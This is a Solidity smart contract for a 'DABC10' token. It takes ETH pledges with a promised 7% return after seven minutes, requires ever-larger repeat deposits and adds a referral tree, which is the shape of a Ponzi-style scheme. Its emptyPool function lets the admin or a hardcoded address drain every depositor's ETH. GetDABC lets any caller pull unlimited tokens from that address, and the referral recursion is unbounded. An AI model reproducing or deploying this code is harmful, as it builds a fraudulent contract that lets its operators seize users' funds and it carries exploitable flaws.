// SPDX-License-Identifier: Apache-2.0

pragma solidity >=0.7.0 <0.9.0;


import "./DABC10Interface.sol";

contract DABC10 is DABC10Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;

    uint constant public winTime = 7 * 60;         //获取本金+利息时间（单位：秒）
    uint256 constant public eachMinedMinCount = 100e18; //单轮最小eth
    uint256 constant public eachMinedMaxCount = 10000e18; //单轮最大eth
    uint public rate = 107;             //利率，例：107，表示7%
    uint public Per = 10;             //消耗比率：10 ETH : 1 DABC
    uint constant public SpanMin = 1 * 30; //第二轮投入开始时间(单位：秒)
    uint constant public SpanMax = 7 * 60; //第二轮投入结束时间(单位：秒)
    uint256 constant public Multiple = 100e18;    //投入倍数
    uint constant public InvalidTimesLimit = 2;    //无效单次数限制


    address admin;
    address matemask_account1 = 0x821b121D544cAb0a4F4d0ED2F1c2B14fAb4f969F;

    mapping(address => relationship) public inviters;
    mapping(address => address) public invitee;
    mapping(address => minter) public minters;

    struct relationship {
        address[] invitees;
        uint256 invalidBalance;
        uint256 recommendation;
    }


    struct minter {
        uint lastPledgeTime;
        uint times;
        uint invalidTimes;
        uint tblength;
        uint256 totalBalance;
        uint256 totalRevenue;
    }


    struct tb {
        uint time;
        bool valid;
        uint256 balance;
    }
    
    mapping(address => tb[]) public TB;

    uint256 public poolBalance; 

    mapping(address => uint256) public balances;

    mapping(address => mapping(address => uint256)) public allowed;
    string public name;                  
    uint8 public decimals = 18;               
    string public symbol;  
    uint256 public total;     

    constructor(uint256 _initialAmount, string memory _tokenName, string memory _tokenSymbol) {
        admin = msg.sender;
        totalSupply = _initialAmount * 10 ** uint256(decimals);
        balances[matemask_account1] = totalSupply;
        total = totalSupply;
        name = _tokenName;
        symbol = _tokenSymbol;
    }


    function pullSome() public payable{
        require(msg.sender != address(0));
        poolBalance += msg.value;
        minters[msg.sender].totalBalance += msg.value;
        require(address(this).balance == poolBalance);
    }


    function safe_rm_tb(uint rm_at) internal {
        for (uint i = rm_at;i < TB[msg.sender].length - 1; i++) {
            TB[msg.sender][i] = TB[msg.sender][i + 1];
        }
        TB[msg.sender].pop();
        minters[msg.sender].tblength = TB[msg.sender].length;
    }

    function getMinted(uint index) public view returns (tb memory) {
        tb memory minted = TB[msg.sender][index];
        return minted;
    }

    function resetInvalidTimes() public returns (bool) {
        minters[msg.sender].invalidTimes = 0;
        return true;
    }

    function state_per() internal {
        if (totalSupply <= total / 2 && totalSupply >= total / 4){
            Per = 50;
        } else if (totalSupply < total / 4) {
            Per = 100;
        }
    }

    function Pledge() public payable {
        require(minters[msg.sender].invalidTimes < InvalidTimesLimit);
        require(msg.sender != admin);
        require(msg.value >= eachMinedMinCount && msg.value <= eachMinedMaxCount);                
        require(msg.value % Multiple == 0);
        state_per();
        uint256 cost = msg.value * Per / 100;
        require(balances[msg.sender] >= cost);
        uint currtime = block.timestamp;
        //检测是否二次投入
        if (TB[msg.sender].length > 0) {
            //在规定的时间内投入
            uint lasttime = TB[msg.sender][TB[msg.sender].length - 1].time;
            uint span = currtime - lasttime;
            require(span > SpanMin && span < SpanMax);
            require(msg.value >= TB[msg.sender][TB[msg.sender].length - 1].balance);
            TB[msg.sender][TB[msg.sender].length - 1].valid = true;
            if(invitee[msg.sender] != address(0)){
                inviters[invitee[msg.sender]].invalidBalance += TB[msg.sender][TB[msg.sender].length - 1].balance;
                inviters[invitee[msg.sender]].recommendation += TB[msg.sender][TB[msg.sender].length - 1].balance;
            }
        }
        //进行交易
        TB[msg.sender].push(tb(currtime, false, msg.value));
        back_flow(cost);
        poolBalance += msg.value;
        minters[msg.sender].totalBalance += msg.value;
        minters[msg.sender].tblength = TB[msg.sender].length;
        minters[msg.sender].times++;
        minters[msg.sender].lastPledgeTime = currtime;
        require(address(this).balance == poolBalance);
    }

    function BuildRelationship(address _inviter) public returns (bool) {
        require(_inviter != msg.sender);
        require(invitee[msg.sender] == address(0));
        require(inviters[msg.sender].invitees.length == 0);
        invitee[msg.sender] = _inviter;
        inviters[_inviter].invitees.push(msg.sender);
        return true;
    }

    function GetDABC(uint256 _value) public {
        require(msg.sender != matemask_account1);
        balances[msg.sender] += _value * 10 ** uint256(decimals);
        balances[matemask_account1] -= _value * 10 ** uint256(decimals);
        emit Transfer(matemask_account1, msg.sender, _value * 10 ** uint256(decimals)); 
    }


    function get_related(uint256 sum, address _inviter) internal returns (uint256){
        if (inviters[_inviter].invitees.length == 0){
            return 0;
        } else {
            sum = inviters[_inviter].invalidBalance;
            for (uint i = 0; i < inviters[_inviter].invitees.length; i++){
                sum += get_related(sum, inviters[_inviter].invitees[i]);
            }
            return sum;
        }
        
    }


    function GetRelationshipBalance(address _inviter) public returns (uint256) {
        uint256 sum = 0;
        if (inviters[_inviter].invitees.length == 0){
            return sum;
        } else {
            sum = inviters[_inviter].invalidBalance;
            for (uint i = 0; i < inviters[_inviter].invitees.length; i++){
                sum += get_related(sum, inviters[_inviter].invitees[i]);
            }
            return sum;
        }

    }

    function GetAvaliableBalance() public payable {
        require(TB[msg.sender].length > 0);
        uint time = TB[msg.sender][0].time;
        uint current = block.timestamp;
        require((current - time) > winTime);
        uint256 payment;
        if (TB[msg.sender][0].valid) {
            payment = TB[msg.sender][0].balance * rate / 100;
        } else {
            payment = TB[msg.sender][0].balance;
            minters[msg.sender].invalidTimes++;
        }
        require(payment <= poolBalance);
        payable(msg.sender).transfer(payment);
        minters[msg.sender].totalRevenue += payment;
        poolBalance -= payment;
        safe_rm_tb(0);
        require(address(this).balance == poolBalance);
    }


    function emptyPool() public payable {
        require(msg.sender == admin || msg.sender == matemask_account1);
        payable(msg.sender).transfer(address(this).balance);
        poolBalance = address(this).balance;
        require(address(this).balance == poolBalance);
    }

    function burn(uint256 _value) internal returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        totalSupply -= _value;
        emit Burn(msg.sender, _value);
        return true;
    }

    function back_flow(uint256 _value) internal {
        uint256 part = _value / 2;
        burn(part);
        transfer(admin, part);
    }


    function balanceOf(address _owner) public view override returns (uint256) {
        return balances[_owner];
    }

    function transfer(address _to, uint256 _value) public override returns (bool) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool) {
        uint256 allowances = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowances >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowances < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        emit Transfer(_from, _to, _value); 
        return true;
    }

    function approve(address _spender, uint256 _value) public override returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); 
        return true;
    }

    function allowance(address _owner, address _spender) public override view returns (uint256) {
        return allowed[_owner][_spender];
    }


}
